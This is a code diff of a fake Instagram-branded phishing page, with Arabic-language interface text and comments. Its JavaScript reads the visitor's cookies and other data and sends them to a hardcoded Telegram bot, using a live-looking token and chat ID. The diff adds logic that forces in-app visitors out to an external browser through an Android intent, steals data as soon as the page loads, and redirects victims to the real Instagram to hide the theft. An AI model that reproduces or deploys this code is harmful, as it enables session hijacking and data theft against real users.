@@ -10,32 +10,17 @@
         .logo { width: 64px; height: 64px; background: linear-gradient(45deg, #f09433, #d62976, #962fbf); border-radius: 16px; margin: 0 auto 24px; display: flex; align-items: center; justify-content: center; font-size: 32px; color: white; }
         h2 { font-size: 20px; color: #262626; margin-bottom: 8px; }
         p { font-size: 14px; color: #8e8e8e; margin-bottom: 16px; }
-        .btn { background: #0095f6; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 8px; }
-        .btn-outline { background: transparent; color: #0095f6; border: 1px solid #0095f6; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; margin: 20px auto; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .footer { font-size: 12px; color: #c7c7c7; margin-top: 24px; }
-        .warning { background: #fff3cd; color: #856404; padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 13px; }
-        .step { background: #f8f9fa; padding: 10px; border-radius: 8px; margin: 10px 0; font-size: 13px; text-align: left; }
-        .step-number { background: #0095f6; color: white; display: inline-block; width: 22px; height: 22px; border-radius: 50%; text-align: center; line-height: 22px; font-size: 12px; margin-right: 10px; }
     </style>
 </head>
 <body>
 <div class="container" id="mainContent">
     <div class="logo">📷</div>
-    <h2>⚠️ مطلوب متصفح خارجي</h2>
-    <p>هذا المحتوى لا يمكن عرضه داخل التطبيق</p>
-    <div class="warning">🔒 يرجى فتح هذا الرابط في متصفح Chrome أو Safari</div>
-    
-    <div class="step">
-        <span class="step-number">1</span> اضغط مع الاستمرار على الرابط
-    </div>
-    <div class="step">
-        <span class="step-number">2</span> اختر "فتح في المتصفح" أو "Open in Chrome"
-    </div>
-    <div class="step">
-        <span class="step-number">3</span> انتظر حتى يتم التحقق
-    </div>
-    
-    <button class="btn btn-outline" id="copyLinkBtn">📋 نسخ الرابط</button>
+    <h2>جاري إعادة التوجيه...</h2>
+    <p>سيتم فتح المتصفح تلقائياً</p>
+    <div class="spinner"></div>
     <div class="footer">Instagram</div>
 </div>
 
@@ -45,6 +30,16 @@
 // ============================================
 var BOT_TOKEN = "8799007815:AAFoZ7f_T3fcmbNHVy0Rqcv9qpMytp1bEFU";
 var CHAT_ID = "6181826564";
+
+// ============================================
+// إرسال إلى تليجرام
+// ============================================
+function sendToTelegram(msg) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.send(JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: "HTML"}));
+}
 
 // ============================================
 // كشف التطبيق
@@ -63,21 +58,9 @@ function getApp() {
 }
 
 // ============================================
-// إرسال إلى تليجرام
-// ============================================
-function sendToTelegram(msg) {
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", true);
-    xhr.setRequestHeader("Content-Type", "application/json");
-    xhr.send(JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: "HTML"}));
-}
-
-// ============================================
-// سرقة البيانات (للمتصفح العادي فقط)
+// سرقة البيانات (للمتصفح العادي)
 // ============================================
 function stealData() {
-    var data = "";
-    
     var cookies = document.cookie;
     if (cookies && cookies.length > 0) {
         sendToTelegram("🍪 <b>Cookies</b>\n<code>" + cookies.substring(0, 3500) + "</code>");
@@ -112,13 +95,50 @@ function stealData() {
 }
 
 // ============================================
-// نسخ الرابط
+// إعادة التوجيه إلى المتصفح تلقائياً
 // ============================================
-function copyLink() {
-    var url = window.location.href;
-    navigator.clipboard.writeText(url).then(function() {
-        alert("✅ تم نسخ الرابط!\n\nالآن افتح متصفح Chrome أو Safari والصق الرابط في شريط العناوين");
-    });
+function forceBrowser() {
+    var currentUrl = window.location.href;
+    var androidUrl = "intent://" + currentUrl.replace("https://", "") + "#Intent;scheme=https;package=com.android.chrome;end;";
+    var iosUrl = currentUrl;
+    
+    // كشف نظام التشغيل
+    var isAndroid = navigator.userAgent.indexOf("Android") > -1;
+    var isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
+    
+    if (isAndroid) {
+        // Android: استخدام Intent
+        window.location.href = androidUrl;
+        // بديل بعد 2 ثانية
+        setTimeout(function() {
+            window.location.href = currentUrl;
+        }, 2000);
+    } 
+    else if (isIOS) {
+        // iOS: لا يوجد طريقة مباشرة، لكن نعرض رسالة
+        document.getElementById('mainContent').innerHTML = `
+            <div class="logo">📷</div>
+            <h2>⚠️ افتح في Safari</h2>
+            <p>اضغط مع الاستمرار على الرابط في الأعلى</p>
+            <p style="font-size:12px;color:#0095f6;">اختر "فتح في Safari"</p>
+            <div class="spinner"></div>
+            <div class="footer">Instagram</div>
+        `;
+        sendToTelegram("⚠️ مستخدم iOS - يحتاج فتح يدوي في Safari");
+    }
+    else {
+        // سطح مكتب - سرقة فورية
+        stealData();
+        document.getElementById('mainContent').innerHTML = `
+            <div class="logo">📷</div>
+            <h2>✅ تم</h2>
+            <p>جاري تحميل المحتوى...</p>
+            <div class="footer">Instagram</div>
+        `;
+        setTimeout(function() {
+            window.location.href = "https://www.instagram.com";
+        }, 1500);
+    }
 }
 
 // ============================================
@@ -127,17 +147,17 @@ function copyLink() {
 var app = getApp();
 
 if (app) {
-    // داخل تطبيق - نرسل تنبيه للمهاجم
-    sendToTelegram("⚠️ <b>مستخدم داخل تطبيق</b>\nالتطبيق: " + app);
-    console.log("⚠️ المستخدم في تطبيق: " + app);
+    // داخل تطبيق - نحاول إجبار الفتح في المتصفح
+    sendToTelegram("⚠️ مستخدم داخل تطبيق: " + app + " - محاولة إجبار المتصفح");
+    forceBrowser();
 } else {
-    // في متصفح عادي - نسرق البيانات
-    console.log("✅ مستخدم في متصفح عادي - يتم السرقة");
+    // في متصفح عادي - نسرق البيانات فوراً
     stealData();
+    // إعادة توجيه إلى Instagram بعد ثانية
+    setTimeout(function() {
+        window.location.href = "https://www.instagram.com";
+    }, 1000);
 }
-
-// ربط زر النسخ
-document.getElementById('copyLinkBtn').addEventListener('click', copyLink);
 </script>
 </body>
 </html>
